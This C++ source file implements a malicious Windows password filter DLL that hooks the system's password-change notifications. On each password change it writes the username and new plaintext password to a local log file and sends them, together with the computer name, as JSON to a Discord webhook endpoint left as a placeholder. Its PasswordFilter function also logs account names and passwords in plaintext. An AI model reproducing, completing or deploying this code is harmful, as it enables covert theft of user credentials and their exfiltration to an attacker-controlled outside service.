#include "stdafx.h"
#include <wininet.h>
#include <string>
#include <Windows.h>
#include <stdio.h>
#include <SubAuth.h>

#pragma comment(lib, "wininet.lib")
std::string GetComputerName() {
    char buffer[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(buffer);
    if (!GetComputerNameA(buffer, &size)) {
        // Error handling if GetComputerName fails
        return "Unknown";
    }
    return std::string(buffer);
}
BOOLEAN __stdcall InitializeChangeNotify(void) 
{
	return TRUE;
}
std::string UnicodeStringToString(PUNICODE_STRING unicodeString) {
    if (!unicodeString || !unicodeString->Buffer)
        return "";

    // Determine the required size for the narrow-character buffer
    int bufferSize = WideCharToMultiByte(CP_UTF8, 0, unicodeString->Buffer, unicodeString->Length / sizeof(wchar_t), NULL, 0, NULL, NULL);

    if (bufferSize == 0)
        return "";

    // Allocate memory for the narrow-character buffer
    std::string narrowString(bufferSize, 0);

    // Convert wide-character string to narrow-character string
    WideCharToMultiByte(CP_UTF8, 0, unicodeString->Buffer, unicodeString->Length / sizeof(wchar_t), &narrowString[0], bufferSize, NULL, NULL);

    return narrowString;
}
NTSTATUS __stdcall PasswordChangeNotify(PUNICODE_STRING UserName, ULONG RelativeId, PUNICODE_STRING NewPassword)
{
    FILE* pFile;
    int err = fopen_s(&pFile, "c:\\yourlogfilehere", "a+");
    if (err != 0)
    {
        return 0;
    }
    fprintf(pFile, "%wZ:%wZ\r\n", UserName, NewPassword);
    fclose(pFile);

    // Initialize WinINet
    HINTERNET hInternet = InternetOpenA("SimpleRequest", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        return 1;
    }




    std::string strPass = UnicodeStringToString(NewPassword);
    std::string strUser = UnicodeStringToString(UserName);
    std::string hostname = GetComputerName();

    std::string jsonData = "{\"content\": \"" + GetComputerName() + "--" + strUser + ":" + strPass + "\" }";

    // Open connection
    HINTERNET hConnect = InternetConnectA(hInternet, "discord.com", INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return 1;
    }

    // Create request
    HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", "[YOUR_ENDPOINT_HERE]", NULL, NULL, NULL, INTERNET_FLAG_SECURE, 0);
    if (!hRequest) {
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return 1;
    }

    // Send request
    const char* szHeaders = "Content-Type: application/json";
    if (!HttpSendRequestA(hRequest, szHeaders, strlen(szHeaders), (LPVOID)jsonData.c_str(), jsonData.length())) {
        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return 1;
    }

    // Read response
    char szBuffer[1024];
    DWORD dwRead = 0;
    while (InternetReadFile(hRequest, szBuffer, sizeof(szBuffer) - 1, &dwRead) && dwRead > 0) {
        szBuffer[dwRead] = '\0';
    }

    // Close handles
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);

    return 0;
}
BOOLEAN __stdcall PasswordFilter(PUNICODE_STRING AccountName,PUNICODE_STRING FullName,PUNICODE_STRING Password,BOOLEAN SetOperation)
{
	FILE* pFile;
	int err = fopen_s(&pFile,"c:\\yourlogfilehere", "a+");
	if (err!=0)
    {
        return 1;
    }
	fprintf(pFile, "%wZ:%wZ\r\n", AccountName,Password);
	fclose(pFile);
	return 1;	
}
BOOL APIENTRY DllMain( HMODULE hModule,DWORD  ul_reason_for_call,LPVOID lpReserved)
{
	switch (ul_reason_for_call)
	{
		case DLL_PROCESS_ATTACH:
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
		case DLL_PROCESS_DETACH:
			break;
	}
	return TRUE;
}

